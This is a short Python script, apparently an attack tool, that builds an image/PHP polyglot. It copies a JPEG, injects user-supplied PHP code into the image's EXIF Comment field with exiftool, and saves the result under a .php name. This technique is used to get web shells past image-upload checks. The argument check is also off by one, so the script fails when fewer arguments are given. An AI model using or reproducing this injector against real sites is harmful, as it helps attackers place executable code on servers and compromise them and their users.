import os
import subprocess
import sys


def main():
    print("Minimal JPG to PHP injector")
    print("Ensure you have exiftool installed on your system")

    if len(sys.argv) < 3:
        print("Usage: python inject.py <input.jpg> <php_code.php> <output.php>")
        sys.exit(1)

    input_jpg = sys.argv[1]
    php_code_file = sys.argv[2]
    output_php = sys.argv[3]

    print(f"Cloning image data from {input_jpg} to {output_php}...")
    with open(input_jpg, "rb") as img_file:
        img_data = img_file.read()

    with open(output_php, "wb") as out_file:
        out_file.write(img_data)

    with open(php_code_file, "r") as code_file:
        php_code = code_file.read()

    print(f"Appending PHP code from {php_code_file} into {output_php}...")
    try:
        cmd = ["exiftool", "-overwrite_original", f"-Comment={php_code}", output_php]
        subprocess.run(cmd, check=True, capture_output=True)
        print(f"Injection complete. Output file: {output_php}")
    except subprocess.CalledProcessError as e:
        print(f"Error running exiftool: {e}")
        print(f"stderr: {e.stderr.decode()}")
    except FileNotFoundError:
        print("exiftool not found. Make sure it's installed and in your PATH.")


main()
